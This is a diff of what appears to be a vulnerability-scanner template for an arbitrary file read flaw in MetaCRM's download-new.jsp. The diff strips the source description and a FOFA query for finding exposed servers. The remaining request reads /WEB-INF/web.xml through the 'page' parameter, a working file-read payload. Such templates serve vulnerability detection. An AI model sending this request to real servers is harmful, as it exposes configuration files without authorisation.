@@ -3,12 +3,8 @@ info:
   name: 美特CRM download-new存在任意文件读取漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/wvbffr21hpks30no'
+  description: ''
   tags: lfi,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: wvbffr21hpks30no
-    fofa: title="MetaCRM" || body="/common/images/login/metacrm.gif" || body="MetaCRM5 loading" || body="Metasoft Co., Ltd."
 http:
 - raw:
   - GET /business/common/download-new.jsp?filename=&page=/WEB-INF/web.xml HTTP/1.1
